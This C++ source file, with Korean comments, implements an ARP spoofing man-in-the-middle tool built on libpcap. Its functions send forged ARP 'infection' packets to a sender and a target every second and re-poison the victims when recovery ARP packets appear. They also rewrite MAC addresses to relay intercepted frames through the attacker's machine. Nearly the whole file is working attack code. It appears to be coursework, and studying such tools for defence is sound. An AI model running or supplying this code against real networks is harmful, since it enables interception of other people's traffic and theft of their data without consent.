#include <thread>
#include <mutex>
#include <vector>
#include <future>

#include "Utill.h"

#define MAC_ADDR_LEN 6

std::mutex arpMutex;

void SendInfectionPacket(pcap_t *handle, char *InterfaceName, Mac atkMac, Mac senderMac, Mac TargetMac, Ip senderIp, Ip targetIp){
    EthArpPacket sender_infect_packet = Sender_Infection(InterfaceName, atkMac, senderMac, senderIp, targetIp);
    EthArpPacket target_infect_packet = Target_Infection(InterfaceName, atkMac, TargetMac, senderIp, targetIp);

    // ARP Spoofing 패킷 전송
    int res_sender = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&sender_infect_packet), sizeof(EthArpPacket));
    if (res_sender != 0)
    {
        fprintf(stderr, "pcap_sendpacket (Sender) return %d error=%s\n", res_sender, pcap_geterr(handle));
    }

    int res_target = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&target_infect_packet), sizeof(EthArpPacket));
    if (res_target != 0)
    {
        fprintf(stderr, "pcap_sendpacket (Target) return %d error=%s\n", res_target, pcap_geterr(handle));
    }
}

void spoofArpPacket(pcap_t *handle, char *InterfaceName, Mac atkMac, Mac senderMac, Mac TargetMac, Ip senderIp, Ip targetIp)
{
    //1초마다 감염패킷 보내는 함수
    while (true)
    {
        // ARP Spoofing 패킷 생성
        SendInfectionPacket(handle, InterfaceName, atkMac, senderMac, TargetMac, senderIp, targetIp);
        // 재전송 간격 설정 (예: 1초)
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

void handleArpPacket(pcap_t *handle, char* InterfaceName, Mac atkMac, Mac senderMac, Mac TargetMac, Ip SenderIP, Ip TargetIp)
{
    // ARP 패킷 수신 및 가로채기 및 변조 및 재전송하는 로직

    EthArpPacket packet;
    while (true)
    {
        const u_char *received_pkt;
        struct pcap_pkthdr *header;
        // ARP 패킷 수신
        int res = pcap_next_ex(handle, &header, &received_pkt);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        if (res==1)
        {
            // ARP 패킷 처리 (가로채기, 변조, 재전송)
            std::lock_guard<std::mutex> lock(arpMutex);
            memcpy(&packet, received_pkt, sizeof(EthArpPacket));
                // 패킷 처리 로직 구현
                // Recovery패킷인지 체크
            if (checkRecoverPacket(packet, SenderIP, TargetIp))
            {
                // 재감염 로직 수행
                SendInfectionPacket(handle, InterfaceName, atkMac, senderMac, TargetMac, SenderIP, TargetIp);
            }
            else{
                //ARP패킷이 아닌경우
                if (packet.eth_.type() != EthHdr::Arp){

                }
            }

            // 1. Sender -> Target 릴레이
            if (packet.arp_.sip() == SenderIP && packet.arp_.tip() == TargetIp)
            {
                // Sender에서 Target으로 가는 ARP 패킷을 가로채서 반대편으로 전송

                packet.eth_.smac_ = atkMac;// Attacker의 MAC 주소;
                packet.eth_.dmac_ = TargetMac;// Target의 MAC 주소;

                pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
            }

            // 2. Target -> Sender 릴레이
            if (packet.arp_.sip() == TargetIp && packet.arp_.tip() == SenderIP)
            {
                // Target에서 Sender로 가는 ARP 패킷을 가로채서 반대편으로 전송
                packet.eth_.smac_ = atkMac;// Attacker의 MAC 주소;
                packet.eth_.dmac_ = senderMac;// Sender의 MAC 주소;

                pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
            }
        }
    }
}

int start_spoofing(char *dev, Ip sip, Ip tip, Mac AtkMac, Ip AtkIp)
{
    // 네트워크 인터페이스(dev)를 열고 핸들(handle) 생성
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 10, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Mac senderMac = getSenderMac(handle, AtkMac, AtkIp, sip, dev);
    Mac targetMac = getTargetMac(handle, AtkMac, AtkIp, tip, dev);

    // ARP Spoofing 스레드 생성
    std::thread spoofingThread(spoofArpPacket, handle, dev, AtkMac, senderMac, targetMac, sip, tip);

    // ARP 패킷 처리 스레드 생성
    std::thread handleThread(handleArpPacket, handle, dev, AtkMac, senderMac, targetMac, sip, tip);

    // 메인 스레드에서 스레드 종료 대기
    spoofingThread.join();
    handleThread.join();

    pcap_close(handle);

    return 0;
}

int main(int argc, char *argv[])
{
    if (argc <= 3)
    { // 입력값이 3개 이하면 에러
        usage();
        return -1;
    }

    char *dev = argv[1]; // 네트워크 인터페이스 명

    std::vector<std::future<int>> spoof_threads;

    Mac Attacker_Mac = getMacAddress(dev);
    if (Attacker_Mac == Mac::nullMac())
    {
        fprintf(stderr, "Failed to get Attacker Mac");
        return -1;
    }

    Ip Attacker_Ip = getAttackerIp(dev);

    std::string sender_ip;
    std::string target_ip;
    for (int i = 2; i < argc - 1; i += 2)
    {
        sender_ip = argv[i];
        target_ip = argv[i + 1];
        start_spoofing(dev, Ip(sender_ip), Ip(target_ip), Attacker_Mac, Attacker_Ip);
        // std::future<int> spoof_thread = std::async(std::launch::async, start_spoofing, dev, argv[i], argv[i + 1]);
        // spoof_threads.push_back(std::move(spoof_thread));
    }

    // 모든 스레드가 끝날 때까지 기다림
    for (auto &thread : spoof_threads)
    {
        thread.get();
    }

    return 0;
}
